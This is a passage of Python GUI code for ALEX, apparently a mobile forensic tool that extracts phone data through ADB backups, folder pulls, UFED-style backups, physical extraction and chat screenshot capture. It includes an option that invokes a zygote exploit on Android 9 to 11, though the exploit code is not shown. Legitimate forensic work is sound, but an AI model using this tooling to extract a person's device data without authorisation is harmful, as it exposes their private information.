        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
        self.progress.pack()
        self.progress.start()
        self.do_root_ffs = threading.Thread(target=lambda: devdump.su_root_ffs(outzip=zip_path, filetext=self.text, prog_text=self.prog_text, log=log, change=self.change))
        self.do_root_ffs.start()
        self.wait_variable(self.change)
        self.text.configure(text="Data Extraction complete.")
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        log(f"FFS Backup complete: {zip_path}")
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))

    #Show the "Pull sdcard" screen
    def show_pull_data(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Extract internal Data", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Preparing Data Extraction ...", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        global data_size
        total_size = 1
        data_size = 0
        if ut == False:
            data_path = "/sdcard/"
        else:
            data_path = device.shell("echo $HOME") + "/"
        self.change = ctk.IntVar(self, 0)
        self.get_dsize = threading.Thread(target=lambda: get_data_size(data_path, self.change))
        self.get_dsize.start()
        self.wait_variable(self.change)
        folder = f'Data_{snr}_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
        zip_path = f"{folder}.zip"
        zip = zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=1)
        try: os.mkdir(folder)
        except: pass
        self.change.set(0)
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
        self.progress.set(0)
        self.prog_text.configure(text="0%")
        self.progress.pack()
        self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change, zip=zip))
        self.pull_data.start()
        self.wait_variable(self.change)
        zip.close()
        try: shutil.rmtree(folder)
        except: pass
        self.text.configure(text="Data Extraction complete.")
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))

    #Show the ADB Backup screen
    def show_adb_bu(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="ADB Backup", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Please choose what Data to include:", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(pady=15)
        self.incl_shared = ctk.StringVar(value="off")
        self.incl_shared_box = ctk.CTkCheckBox(self.dynamic_frame, text="Include the shared Memory.", variable=self.incl_shared, onvalue="on", offvalue="off")
        self.incl_shared_box.pack(anchor="w", padx= 80, pady=5)
        self.incl_apps = ctk.StringVar(value="on")
        self.incl_apps_box = ctk.CTkCheckBox(self.dynamic_frame, text="Include all available Apps.", variable=self.incl_apps, onvalue="on", offvalue="off")
        self.incl_apps_box.pack(anchor="w", padx= 80, pady=5)
        self.incl_system = ctk.StringVar(value="on")
        self.incl_system_box = ctk.CTkCheckBox(self.dynamic_frame, text="Include System-Apps.", variable=self.incl_system, onvalue="on", offvalue="off")
        self.incl_system_box.pack(anchor="w", padx= 80, pady=5)
        self.change = ctk.IntVar(self, 0)
        self.startb = ctk.CTkButton(self.dynamic_frame, text="Start", font=self.stfont, command=lambda: self.adb_bu(self.change, incl_shared=self.incl_shared.get(), incl_apps=self.incl_apps.get(), incl_system=self.incl_system.get()))
        self.startb.pack(pady=20) 
        self.backb = ctk.CTkButton(self.dynamic_frame, text="Back", font=self.stfont, fg_color="#8c2c27", text_color="#DCE4EE", command=lambda: self.switch_menu("AcqMenu"))
        self.backb.pack(pady=5)
        self.wait_variable(self.change)
        self.text.configure(text="ADB-Backup complete.")
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))

    #Show the UFED-Style Backup screen
    def show_ufed_bu(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Logical+ Backup (UFED-Style)", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Please unlock the device and confirm \"Backup my Data\".", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(pady=15)
        total_size = 1
        global data_size
        data_size = 0
        log("Started UFED-Style Logical+ Backup")
        now = datetime.now()
        local_timezone = datetime.now(timezone.utc).astimezone().tzinfo
        utc_offset = now.astimezone().utcoffset()
        utc_offset_hours = utc_offset.total_seconds() / 3600
        if utc_offset_hours >= 0:
            sign = "+"
        else:
            sign = "-"
        output_format = "%d/%m/%Y %H:%M:%S" 
        starttime = str(now.strftime(output_format)) + " (" + sign + str(int(utc_offset_hours)) + ")"
        ufed_folder = f"{snr}_Advanced_Logical_UFED_Style_{str(datetime.now().strftime('%Y_%m_%d_%H_%M_%S'))}"
        try: 
            os.mkdir(ufed_folder)
        except: 
            return
        fname = f'{brand}_{model}'
        zip_path = f"{fname}.zip"
        zip = zipfile.ZipFile(os.path.join(ufed_folder, zip_path), "w", compression=zipfile.ZIP_DEFLATED, compresslevel=1)
        self.incl_shared = ctk.StringVar(value="off")
        self.incl_apps = ctk.StringVar(value="on")
        self.incl_system = ctk.StringVar(value="on")
        self.change = ctk.IntVar(self, 0)
        self.adbu = threading.Thread(target=lambda: self.adb_bu(self.change, incl_shared=self.incl_shared.get(), incl_apps=self.incl_apps.get(), incl_system=self.incl_system.get()))
        self.adbu.start()
        self.wait_variable(self.change)
        self.prog_text.configure(text="")
        self.change.set(0)
        self.zip_backup = threading.Thread(target=lambda: self.zip_bu(zip, self.text, self.change))
        self.zip_backup.start()
        self.wait_variable(self.change)
        data_path = "/sdcard/"
        
        self.get_dsize = threading.Thread(target=lambda: get_data_size(data_path, self.change))
        self.get_dsize.start()
        self.wait_variable(self.change)
        folder = f'Data_{snr}_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
        self.change.set(0)
        self.progress.pack_forget()
        self.prog_text.configure(text="0%")
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
        self.progress.set(0)
        self.prog_text.configure(text="0%")
        self.progress.pack()
        self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change, zip=zip, mode="ufed"))
        self.pull_data.start()
        self.wait_variable(self.change)
        zip.close()
        try: shutil.rmtree(folder)
        except: pass
        self.change.set(0)
        self.prog_text.configure(text="")
        self.progress.pack_forget()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
        self.progress.pack()
        self.progress.start()
        self.ufd_data = threading.Thread(target=lambda: ufed_style_files(self.change, ufed_folder, zip, fname, starttime, self.text))
        self.ufd_data.start()
        self.wait_variable(self.change)
        self.text.configure(text="Advanced Logical Backup complete.")
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        log("UFED-Style Logical+ Backup complete")
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))  

    #Show the "PRFS"-Backup screen
    def show_prfs(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="PRFS Backup", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Please choose what Data to include:", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        sysfolders = ["/system/apex/","/system/app/","/system/bin/", "/system/cameradata/", "/system/container/", "/system/etc/",
                      "/system/fake-libs/", "/system/fonts/", "/system/framework/", "/system/hidden/", "/system/lib/", "/system/lib64/", 
                      "/system/media/", "/system/product/", "/system/priv-app/", "/system/saiv/", "/system/tts/", "/system/usr/", "/system/vendor/", 
                      "/system/xbin/, /product/, /vendor/, /etc/"]
        sysfolders.extend(apps_path)
        global data_size
        global total_size
        total_size = 1
        data_size = 0
        data_path = "/sdcard/"
        self.change = ctk.IntVar(self, 0)

        self.incl_sdcard = ctk.StringVar(value="on")
        self.incl_sdcard_box = ctk.CTkCheckBox(self.dynamic_frame, text="Include the \"scdard\" folder.", variable=self.incl_sdcard, onvalue="on", offvalue="off")
        self.incl_sdcard_box.pack(anchor="w", padx= 80, pady=5)
        self.incl_system = ctk.StringVar(value="on")
        self.incl_system_box = ctk.CTkCheckBox(self.dynamic_frame, text="Include available \"System\" folders", variable=self.incl_system, onvalue="on", offvalue="off")
        self.incl_system_box.pack(anchor="w", padx= 80, pady=5)
        self.incl_cve = ctk.StringVar(value="on")
        self.incl_cve_box = ctk.CTkCheckBox(self.dynamic_frame, text="Try to perform exploits to acquire more Data.", variable=self.incl_cve, onvalue="on", offvalue="off")
        self.incl_cve_box.pack(anchor="w", padx= 80, pady=5)
        self.incl_dbfiles = ctk.StringVar(value="on")
        self.incl_dbfiles_box = ctk.CTkCheckBox(self.dynamic_frame, text="Include recreated Databases from Content Providers.", variable=self.incl_dbfiles, onvalue="on", offvalue="off")
        self.incl_dbfiles_box.pack(anchor="w", padx= 80, pady=5)
        self.startb = ctk.CTkButton(self.dynamic_frame, text="Start", font=self.stfont, command=lambda: self.change.set(1))
        self.startb.pack(pady=25) 
        self.backb = ctk.CTkButton(self.dynamic_frame, text="Back", font=self.stfont, fg_color="#8c2c27", text_color="#DCE4EE", command=lambda: self.switch_menu("AcqMenu"))
        self.backb.pack()
        self.wait_variable(self.change)
        self.incl_sdcard_box.pack_forget()
        self.incl_system_box.pack_forget()
        self.incl_cve_box.pack_forget()
        self.incl_dbfiles_box.pack_forget()
        self.startb.pack_forget()
        self.backb.pack_forget()
        incl_sdcard = self.incl_sdcard.get()
        incl_system = self.incl_system.get()
        incl_cve = self.incl_cve.get()
        incl_dbfiles = self.incl_dbfiles.get()
        self.text.configure(height=60)
        self.after(50)

        if incl_sdcard == "on":
            self.change.set(0)
            self.text.configure(text="Preparing Data Extraction ...")
            self.get_dsize = threading.Thread(target=lambda: get_data_size(data_path, self.change))
            self.get_dsize.start()
            self.wait_variable(self.change)
        folder = f'{snr}_prfs_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
        zip_path = f"{folder}.zip"
        zip = zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=1)
        
        try: os.mkdir(folder)
        except: pass
        self.change.set(0)
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
        self.progress.set(0)
        self.prog_text.configure(text="0%")
        self.progress.pack()

        # Create a device_info file
        self.change.set(0)
        self.create_info = threading.Thread(target=lambda: save_info_json(zip_path=zip, change=self.change))
        self.create_info.start()
        self.wait_variable(self.change)

        if incl_sdcard == "on":
            self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change, zip=zip))
            self.pull_data.start()
            self.wait_variable(self.change)
            try: shutil.rmtree(folder)
            except: pass
        if incl_system == "on":
            for sys_folder in sysfolders:
                self.after(10)
                total_size = 1
                data_size = 0
                data_path = sys_folder
                self.change.set(0)
                self.get_dsize = threading.Thread(target=lambda: get_data_size(data_path, self.change))
                self.get_dsize.start()         
                self.wait_variable(self.change)
                if total_size > 1:
                    folder = ".temp_folder"
                    try: os.mkdir(folder)
                    except: pass
                    self.change.set(0)
                    self.prog_text.configure(text="0%")
                    self.progress.set(0)
                    self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change, zip=zip))
                    self.pull_data.start()
                    self.wait_variable(self.change)
                    try: shutil.rmtree(folder)
                    except: pass
                else:
                    pass
        zip.close()
        try: shutil.rmtree(folder)
        except: pass

        # Exploiting attempt
        if incl_cve == "on":
            if int(software.split(".")[0]) in range(9,12):
                self.change.set(0)
                self.prog_text.configure(text="")
                self.progress.pack_forget()
                self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
                self.progress.pack()
                self.progress.start()
                self.pull_zygote = threading.Thread(target=lambda: exploit_zygote(zip_path=zip_path, text=self.text, prog_text=self.prog_text, change=self.change))
                self.pull_zygote.start()
                self.wait_variable(self.change)
            else:
                pass

        # Database Recreation
        if incl_dbfiles == "on":
            #self.text.configure(text="Trying to recreate Databases.")
            self.change.set(0)
            self.prog_text.configure(text="")
            self.progress.pack_forget()
            self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
            self.progress.pack()
            self.progress.start()
            self.recreate_dbs = threading.Thread(target=lambda: recreate_dbs(change=self.change, text=self.text, zip_path=zip_path))
            self.recreate_dbs.start()
            self.wait_variable(self.change)
        self.text.configure(text="Data Extraction complete.")
        log(f"Created Backup: {zip_path}")
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))

    def adb_bu(self, change, incl_shared, incl_apps, incl_system):
        global bu_file
        try:
            self.startb.pack_forget()
            self.backb.pack_forget()
            self.incl_apps_box.pack_forget()
            self.incl_shared_box.pack_forget()
            self.incl_system_box.pack_forget()
        except:
            pass
        self.text.pack_forget()
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Please unlock the device and confirm \"Backup my Data\".", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(pady=25)
        bu_options = " -apk -obb"
        if incl_shared == "on":
            bu_options = bu_options + " -shared"
        else:
            bu_options = bu_options + " -noshared"
        if incl_apps == "on":
            bu_options = bu_options + " -all"
            if incl_system == "on":
                bu_options = bu_options + " -system"
            else:
                bu_options = bu_options + " -nosystem"
        bu_options = bu_options + " -widgets -keyvalue"
        bu_file = f'{snr}_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}_backup.ab'
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
        self.progress.pack()
        self.progress.start()
        self.bu_change = ctk.IntVar(self, 0)
        self.call_bu = threading.Thread(target=lambda: self.call_backup(bu_file=bu_file, bu_change=self.bu_change, bu_options=bu_options))
        self.call_bu.start()
        self.wait_variable(self.bu_change)
        change.set(1)


    def call_backup(self, bu_file, bu_change, bu_options):
        total = 0
        #print(bu_options)
        try:
            with open(bu_file, "wb") as f:
                proc = subprocess.Popen(["adb", "exec-out", f"bu backup{bu_options}"], stdout=subprocess.PIPE)
                stream = proc.stdout
                #stream = device.shell(f"bu backup{bu_options}", stream=True)
                while True:
                    chunk = stream.read(65536)
                    self.text.configure(text="ADB-Backup is running.\nThis may take some time.")
                    if not chunk:
                        break
                    f.write(chunk)
                    total += len(chunk)
                    self.prog_text.configure(text=f"{total/1024/1024:.1f} MB written")
            log(f"Created Backup: {bu_file}")
        except Exception as e:
            log(f"Error creating backup: {e}")
            pass

        bu_change.set(1)    

    def zip_bu(self, zip, text, change):
        text.configure(text="Including the backup to the Zip.")
        try:
            zip.write(bu_file, "backup/backup.ab")
            os.remove(bu_file)
        except:
            pass
        change.set(1)

    #Show Bugreport-Screen (Dumpsys)
    def show_bugreport(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Collect Bugreport", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Creating a Dumpstate Zip file.", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(pady=15)
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)        
        self.progress.pack()
        self.progress.start()
        self.change = ctk.IntVar(self, 0)
        self.get_bugreport = threading.Thread(target=lambda: dump_bugreport(self.change, self.progress, self.prog_text))
        self.get_bugreport.start()
        self.wait_variable(self.change)
        self.text.configure(text=f"Bugreport saved as: {snr}_dumpstate.zip")
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("LogMenu")).pack(pady=40)) 

    ## Ubuntu Touch visible Options ##

    #Show UT-Physical
    def show_ut_physical(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Physical Extraction", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        if ut == True:
            self.text = ctk.CTkLabel(self.dynamic_frame, text=f'Provide the correct \"sudo\" password:\n(Mostly the device passcode)', width=585, height=60, font=self.stfont, anchor="w", justify="left")
        else:
            self.text = ctk.CTkLabel(self.dynamic_frame, text='Starting physical acquisition ...', width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(pady=15)
        self.change = ctk.IntVar(self, 0)
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
        self.progress.set(0)
        self.prog_text.configure(text="0%")
        if aos == True:
            self.aosphysical = threading.Thread(target=lambda: ut_physical(change=self.change, text=self.text, progress=self.progress, prog_text=self.prog_text))
            self.aosphysical.start()            
        elif rec_root == True:
            self.recphysical = threading.Thread(target=lambda: ut_physical(change=self.change, text=self.text, progress=self.progress, prog_text=self.prog_text))
            self.recphysical.start()   
        else:
            self.passwordbox = ctk.CTkEntry(self.dynamic_frame, width=200, height=20, corner_radius=0, show="*")
            self.passwordbox.bind(sequence="<Return>", command=lambda x: ut_physical(change=self.change, text=self.text, progress=self.progress, prog_text=self.prog_text, pw_box=self.passwordbox, ok_button=self.okb, back_button=self.backb))
            self.passwordbox.pack(pady = 15) 
            self.okb = ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: ut_physical(change=self.change, text=self.text, progress=self.progress, prog_text=self.prog_text, pw_box=self.passwordbox, ok_button=self.okb, back_button=self.backb))
            self.okb.pack(pady=15) 
            self.backb = ctk.CTkButton(self.dynamic_frame, text="Back", font=self.stfont, fg_color="#8c2c27", text_color="#DCE4EE", command=lambda: self.switch_menu("AcqMenu"))
            self.backb.pack(pady=5)
        self.wait_variable(self.change)
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))  

    ## End of UT Options ##

    #Device screenshot
    def screen_device(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Take Screenshots", height=30, width=585, font=("standard",24), justify="left").pack(pady=10)
        self.shotframe = ctk.CTkFrame(self.dynamic_frame, width=400, corner_radius=0, fg_color="transparent")
        self.textframe = ctk.CTkFrame(self.dynamic_frame, width=200, corner_radius=0, fg_color="transparent")
        self.shotframe.pack(side="left", pady=20, padx=30, fill="y", expand=True)
        self.textframe.pack(side="left", pady=20, fill="both", expand=True)
        self.placeholder_image = ctk.CTkImage(dark_image=Image.open(os.path.join(os.path.dirname(__file__), "assets" , "screen_alex.png")), size=(240, 426))
        self.imglabel = ctk.CTkLabel(self.shotframe, image=self.placeholder_image, text=" ", width=240, height=426, font=self.stfont, anchor="w", justify="left")
        self.imglabel.pack()
        try: os.mkdir("screenshots")
        except: pass
        self.shotbutton = ctk.CTkButton(self.textframe, text="Screenshot", font=self.stfont, command=lambda: self.shotthread(self.imglabel, self.namefield))
        self.shotbutton.pack(pady=20, ipadx=0, anchor="w")
        self.abortbutton = ctk.CTkButton(self.textframe, text="Back", font=self.stfont, command=lambda: self.switch_menu("AdvMenu"))
        self.abortbutton.pack(pady=5, ipadx=0, anchor="w")
        self.namefield = ctk.CTkLabel(self.textframe, text=" ", width=300, height=100, font=self.stfont, anchor="w", justify="left")
        self.namefield.pack(anchor="w", pady=10)

    def shotthread(self, imglabel, namefield):
        self.doshot = threading.Thread(target=lambda: self.shot(self.imglabel, self.namefield))
        self.doshot.start()

    def shot(self, imglabel, namefield):
        hsize = 426
        shotfail = False
        name = snr + "_" + str(datetime.now().strftime("%m_%d_%Y_%H_%M_%S"))
        filename = name + ".png"
        hashname = name + ".txt"
        filepath = os.path.join("screenshots", filename)
        hashpath = os.path.join("screenshots", hashname)
        if ut == True:
            shot = ut_app_shot()
            png_bytes = BytesIO()
            shot.save(png_bytes, format="PNG")
            png = png_bytes.getvalue()
        elif aos == True:
            shotfail = True
            shot_path = "/home/ceres/alex_shot.png"
            device.shell(f"screenshottool {shot_path} 0")
            device.sync.pull(shot_path, filepath)
            device.shell(f"rm {shot_path}")
            shot = Image.open(filepath)
            png_bytes = BytesIO()
            shot.save(png_bytes, format="PNG")
            png = png_bytes.getvalue()
        else:
            try:
                shot = device.screenshot(error_ok=False)
                png_bytes = BytesIO()
                shot.save(png_bytes, format="PNG")
                png = png_bytes.getvalue()
            except:
                shotfail = True
                shot_path = "/sdcard/alex_shot.png"
                device.shell(f"screencap {shot_path}")
                device.sync.pull(shot_path, filepath)
                device.shell(f"rm {shot_path}")
                shot = Image.open(filepath)
                png_bytes = BytesIO()
                shot.save(png_bytes, format="PNG")
                png = png_bytes.getvalue()
        
        hperc = (hsize/float(shot.size[1]))
        wsize = int((float(shot.size[0])*float(hperc)))
        if wsize > 300:
            wsize = 300
            wperc = (wsize/float(shot.size[0]))
            hsize = int((float(shot.size[1])*float(wperc)))
        screensh = ctk.CTkImage(dark_image=shot, size=(wsize, hsize))
        imglabel.configure(image=screensh)
        if shotfail == False:
            hash_sha256 = hashlib.sha256(png).hexdigest()
        else: 
            hash_sha256 = hashlib.sha256(open(filepath, "rb").read()).hexdigest()
        
        if shotfail == False:
            with open(filepath, "wb") as file:
                file.write(png)
        with open(hashpath, "w") as hash_file:
            hash_file.write(hash_sha256)
        log(f"Created screenshot {filename} with hash {hash_sha256}")
        namefield.configure(text=f"Screenshot saved as:\n{filename}\nHash saved as:\n{hashname}")
        self.pdf_report(pdf_type="screenshot", shot=filename, sha256=hash_sha256, shot_png=filepath, w=wsize, h=hsize)

    def chat_shotloop(self):
        try: os.mkdir("screenshots")
        except: pass
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Chat Capture", height=30, width=585, font=("standard",24), justify="left").pack(pady=10)
        self.shotframe = ctk.CTkFrame(self.dynamic_frame, width=400, corner_radius=0, fg_color="transparent")
        self.textframe = ctk.CTkFrame(self.dynamic_frame, width=200, corner_radius=0, fg_color="transparent")
        self.shotframe.pack(side="left", pady=20, padx=30, fill="y", expand=True)
        self.textframe.pack(side="left", pady=20, fill="both", expand=True)
        self.placeholder_image = ctk.CTkImage(dark_image=Image.open(os.path.join(os.path.dirname(__file__), "assets" , "screen_alex.png")), size=(240, 426))
        self.imglabel = ctk.CTkLabel(self.shotframe, image=self.placeholder_image, text=" ", width=240, height=426, font=self.stfont, anchor="w", justify="left")
        self.imglabel.pack()
        self.text = ctk.CTkLabel(self.textframe, text="Open the chat application and the chat\nyou want to capture, enter the name of\nthe chosen chat in the given fields", width=300, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="w")
        self.appbox = ctk.CTkEntry(self.textframe, width=140, height=20, corner_radius=0, placeholder_text="name of the app")
        self.appbox.pack(pady=10, ipadx=0, anchor="w")
        self.chatbox = ctk.CTkEntry(self.textframe, width=140, height=20, corner_radius=0, placeholder_text="name of the chat")
        self.chatbox.pack(pady=10, ipadx=0, anchor="w")
        self.upbutton = ctk.CTkButton(self.textframe, text="↑ Up", font=self.stfont, command=lambda: self.chatshotthread(app_name=self.appbox.get(), chat_name=self.chatbox.get(), direction="up", imglabel=self.imglabel, namefield=self.namefield, text=self.text))
        self.upbutton.pack(pady=10, ipadx=0, anchor="w")
        self.downbutton = ctk.CTkButton(self.textframe, text="↓ Down", font=self.stfont, command=lambda: self.chatshotthread(app_name=self.appbox.get(), chat_name=self.chatbox.get(), direction="down", imglabel=self.imglabel, namefield=self.namefield, text=self.text))
        self.downbutton.pack(pady=10, ipadx=0, anchor="w")
        self.breakbutton = ctk.CTkButton(self.textframe, text="Cancel Loop", fg_color="#8c2c27", text_color="#DCE4EE", font=self.stfont, command=self.breakshotloop)
        self.breakbutton.pack(pady=10, ipadx=0, anchor="w")
        self.abortbutton = ctk.CTkButton(self.textframe, text="Back", font=self.stfont, command=lambda: self.switch_menu("AdvMenu"))
        self.abortbutton.pack(pady=10, ipadx=0, anchor="w")
        self.namefield = ctk.CTkLabel(self.textframe, text=" ", width=300, height=60, font=self.stfont, anchor="w", justify="left")
        self.namefield.pack(anchor="w", pady=5)


    def chatshotthread(self, app_name, chat_name, direction, imglabel, namefield, text):
        ab_count = 0
        sc_count = 0
        abs_count = 0
        self.upbutton.configure(state="disabled")
        self.downbutton.configure(state="disabled")
        self.abortbutton.configure(state="disabled")
        self.stop_event.clear()
        self.doshot = threading.Thread(target=lambda: self.shotloop(app_name, chat_name, ab_count, sc_count, abs_count, direction, imglabel, namefield, text, first=True))
        self.doshot.start()
        
    
    def breakshotloop(self):
        self.stop_event.set()
    
    def shotloop(self, app_name, chat_name, ab_count, sc_count, abs_count, direction, imglabel, namefield, text, png=None, first=False, seen_hashes=None, first_hash=None, w=0, h=0):
        name = chat_name + "_" + str(datetime.now().strftime("%m_%d_%Y_%H_%M_%S"))
        filename = name + ".png"
        hashname = name + ".txt"
        filepath = os.path.join("screenshots", app_name, chat_name, filename)
        hashpath = os.path.join("screenshots", app_name, chat_name, hashname)
        shotfail = False
        hsize = 426
        if direction == "down":
            swipe_direction = lambda: device.swipe(w//2, h//2, w//2, 0, 0.5)
        else:
            swipe_direction = lambda: device.swipe(w//2, h//2, w//2, h, 0.5)
        if text != None:
            text.configure(text="Chat capture is running.")
        if first != False:
            try: os.mkdir(os.path.join("screenshots", app_name))
            except: pass
            try: os.mkdir(os.path.join("screenshots", app_name, chat_name))
            except: pass
            seen_hashes = []
            try:
                shot = device.screenshot(error_ok=False)
                png_bytes = BytesIO()
                shot.save(png_bytes, format="PNG")
                png = png_bytes.getvalue()
            except:
                shotfail = True
                shot_path = "/sdcard/alex_shot.png"
                device.shell(f"screencap {shot_path}")
                device.sync.pull(shot_path, filepath)
                device.shell(f"rm {shot_path}")
                shot = Image.open(filepath)
                png_bytes = BytesIO()
                shot.save(png_bytes, format="PNG")
                png = png_bytes.getvalue()
            hperc = (hsize/float(shot.size[1]))
            wsize = int((float(shot.size[0])*float(hperc)))
            w = shot.size[0]
            h = shot.size[0]
            if wsize > 300:
                wsize = 300
                wperc = (wsize/float(shot.size[0]))
                hsize = int((float(shot.size[1])*float(wperc)))
            screensh = ctk.CTkImage(dark_image=shot, size=(wsize, hsize))
            imglabel.configure(image=screensh)
            if shotfail == False:
                with open(os.path.join(filepath), "wb") as file:
                    file.write(png)
                hash_sha256 = hashlib.sha256(png).hexdigest()
            else:
                hash_sha256 = hashlib.sha256(open(filepath, "rb").read()).hexdigest()
            with open(os.path.join(hashpath), "w") as hash_file:
                hash_file.write(hash_sha256)
            log(f"Created screenshot {filename} with hash {hash_sha256}")
            namefield.configure(text=f"Screenshot saved as:\n{filename}\nHash saved as:\n{hashname}")
            first_hash = imagehash.phash(shot)
            seen_hashes.append(first_hash)
